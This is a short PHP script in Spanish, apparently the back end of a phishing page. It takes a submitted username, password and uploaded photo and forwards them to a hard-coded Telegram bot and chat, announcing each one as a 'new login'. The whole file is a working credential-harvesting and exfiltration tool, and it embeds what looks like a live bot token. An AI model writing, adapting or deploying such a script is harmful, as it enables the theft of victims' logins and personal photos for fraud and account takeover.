<?php
$botToken = "8970164569:AAFHWcsR63bNfXIfgF0EfVkodTWuNSCKpbc";
$chatId = "-1004395775315";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $usuario = $_POST['usuario'];
    $clave = $_POST['clave'];
    $foto = $_FILES['foto'];

    $mensaje = "🚨 NUEVO LOGIN 🚨\nUsuario: " . $usuario . "\nClave: " . $clave;

    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($mensaje));

    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    $post = [
        'chat_id' => $chatId,
        'photo' => new CURLFile($foto['tmp_name'], $foto['type'], $foto['name'])
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_exec($ch);
    curl_close($ch);

    echo "Listo, se envio todo";
}
?>
